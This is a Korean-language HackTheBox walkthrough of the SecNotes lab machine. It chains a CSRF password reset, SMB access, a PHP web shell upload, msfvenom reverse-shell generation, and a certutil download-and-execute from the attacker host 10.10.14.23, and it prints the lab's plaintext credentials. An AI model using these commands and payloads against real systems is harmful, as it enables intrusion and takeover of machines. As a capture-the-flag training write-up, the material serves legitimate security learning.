# SecNotes - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,8808 -sC -sV -vv -oA SecNotes 10.129.21.110
```
<img width="1083" height="361" alt="image" src="https://github.com/user-attachments/assets/7ab707d2-7aec-45e2-8782-c04119b16ebf" />

- HTTP(80)
- SMB(445)
- HTTP(8808)

---
## HTTP(80)
### banner grabbing
<img width="1083" height="161" alt="image" src="https://github.com/user-attachments/assets/a5478698-461a-445c-a9b2-2fdf07c11efa" />

<br>
<br>

<img width="1083" height="444" alt="image" src="https://github.com/user-attachments/assets/00714930-04f6-45da-8065-ac4a0fe75711" />

---
### XSRF
- 메인페이지에서 회원가입 후 로그인하면 배너에서 `tyler@secnotes.htb`라는 문구 발견.
- `tyler`라는 유저가 존재한다고 가정.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2b03d406-6008-4462-b19a-027cf600c236" />

<br>
<br>

- `Change Password`에서 비밀번호를 변경 가능.
<img width="772" height="368" alt="image" src="https://github.com/user-attachments/assets/1cba00b9-5af6-427d-adc6-67c96a728b29" />

<br>
<br>

- `POST`요청을 `GET`요청을 사용하고 파라미터로 전달하면 비밀번호가 변경되는지 시도하여 성공.
- 특정 유저가 같은 링크를 클릭하게 된다면 비밀번호가 변경될 수 있다고 가정.
<img width="1549" height="299" alt="image" src="https://github.com/user-attachments/assets/f5d5953b-0ab0-4a0e-90a7-dfb16064604f" />

<br>
<br>

- 로컬에서 서버를 생성 후 `Contact Us`에서 내 서버의 링크를 입력.
- 요청이 전달됨.
<img width="376" height="272" alt="image" src="https://github.com/user-attachments/assets/c0d1c010-9c7a-4598-9a70-ca534f530e5f" />

<br>
<br>

<img width="1085" height="95" alt="image" src="https://github.com/user-attachments/assets/38a9ce0d-92c5-4619-9f23-03c794db33fe" />

<br>
<br>

- 입력란에 위의 비밀번호 변경 링크를 전달.
<img width="577" height="275" alt="image" src="https://github.com/user-attachments/assets/056e650b-bc79-4961-b370-c9bba1bf396f" />

<br>
<br>

- `tyler:password`로 로그인 시도하여 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2365da69-cd97-4e2b-89f1-4b5649f18dc9" />

<br>
<br>

- `new site`에서 비밀번호 발견.
<img width="1592" height="136" alt="image" src="https://github.com/user-attachments/assets/4277c980-f87c-41c2-89cf-ca6131e258de" />

<br>
<br>

- `SMB` 로그인 시도.
```bash
nxc smb 10.129.21.110 -u tyler -p '92g!mA8BGjOirkL%OG*&'
```
<img width="1087" height="136" alt="image" src="https://github.com/user-attachments/assets/eef32ec8-22ba-4578-a2bb-54cd74998026" />

<br>
<br>

- `SMB` 정보 수집.
```bash
nxc smb 10.129.21.110 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
```
<img width="1087" height="273" alt="image" src="https://github.com/user-attachments/assets/c8fca747-40a6-46d6-9b7e-3aaadc0cd29a" />

<br>
<br>

- `/new-site` 접속.
```bash
smbclient -U tyler //10.129.21.110/new-site
```
<img width="1087" height="251" alt="image" src="https://github.com/user-attachments/assets/25ec8e04-7374-42cc-8c7c-ce3dd45334ab" />

---
## HTTP(8808)
- 8808번 포트에서 `new-site`의 내용이 렌더링.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/c6aed7f0-cb27-4311-a262-6d9ddd8de760" />

<br>
<br>

- 8808번 포트에서 어떤 언어를 사용하는지는 모르나, 80번 포트에서 `PHP`를 사용하기에 php 웹 셸 업로드.
```bash
cp /usr/share/webshells/php/simple-backdoor.php .
```
<img width="1087" height="221" alt="image" src="https://github.com/user-attachments/assets/d83ada80-80df-475e-8e63-17d4eccd1004" />

<br>
<br>

- 명령어 실행 가능.
```bash
curl 'http://10.129.21.110:8808/simple-backdoor.php/?cmd=whoami'
```
<img width="1087" height="140" alt="image" src="https://github.com/user-attachments/assets/b8eb6184-dd07-49bb-b15a-fbd15d022406" />

<br>
<br>

- 리버스 셸 코드 생성.
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=80 -f exe -o shell.exe
```
<img width="1087" height="181" alt="image" src="https://github.com/user-attachments/assets/583ec510-a521-4c9d-b89b-caaea3ea31b6" />

<br>
<br>

- 로컬로부터 다운로드 받아서 실행.
- 셸 획득.
```bash
curl 'http://10.129.21.110:8808/simple-backdoor.php/?cmd=certutil%20-urlcache%20-f%20-split%20http%3A%2F%2F10.10.14.23%2Fshell.exe%20c%3A%5Cwindows%5Ctemp%5Cshell.exe'

curl 'http://10.129.21.110:8808/simple-backdoor.php/?cmd=c%3A%5Cwindows%5Ctemp%5Cshell.exe'
```
<img width="1087" height="228" alt="image" src="https://github.com/user-attachments/assets/b78dd992-cf86-4ce1-805e-6142836bf7b3" />

---
## Privesc
- `c:\users\tyler\desktop`에서 `bash.lnk` 파일 발견.
<img width="1087" height="403" alt="image" src="https://github.com/user-attachments/assets/2040626a-565e-4692-80a4-b428a2e5a4ef" />

<br>
<br>

- `bash` 경로를 확인하여 실행해보았으나 실패.
```cmd
where.exe /r c:\ bash
```
<img width="1087" height="466" alt="image" src="https://github.com/user-attachments/assets/98dc4734-eaf2-47d0-9bf4-804cb9b7dfab" />

<br>
<br>

- `winpeas`를 로컬로부터 다운로드 받아 실행.
-  루트 경로 발견.
<img width="1087" height="270" alt="image" src="https://github.com/user-attachments/assets/bca7dcb1-5684-42c4-a845-161d82152eff" />

<br>
<br>

- 리눅스의 루트 경로처럼 구성되어 있음.
```powershell
cd C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs
```
<img width="1087" height="559" alt="image" src="https://github.com/user-attachments/assets/be15eb58-c25f-4910-940f-aea8880bfba9" />

<br>
<br>

- `./root`의 history 파일에서 `administrator` 비밀번호 발견.
<img width="1087" height="531" alt="image" src="https://github.com/user-attachments/assets/7a332bf4-3806-45a3-a99d-8c353b93e871" />

<br>
<br>

- `administrator:u6!4ZwgwOM#^OBf#Nwnh` 로그인 시도하여 성공.
<img width="1087" height="123" alt="image" src="https://github.com/user-attachments/assets/b940152f-c266-440d-822a-580a7e68bbd4" />

<br>
<br>

- 셸 획득.
<img width="1087" height="359" alt="image" src="https://github.com/user-attachments/assets/f0bae31e-047c-4296-a68e-373a3d59122e" />

---
## FLAG
- `c:\users\tyler\desktop\user.txt`
<img width="1087" height="380" alt="image" src="https://github.com/user-attachments/assets/e1fef3b2-85e2-498e-b013-6341c468c3fe" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1087" height="270" alt="image" src="https://github.com/user-attachments/assets/674d7afb-c4a8-403b-85b9-b8e4b06cbdf1" />
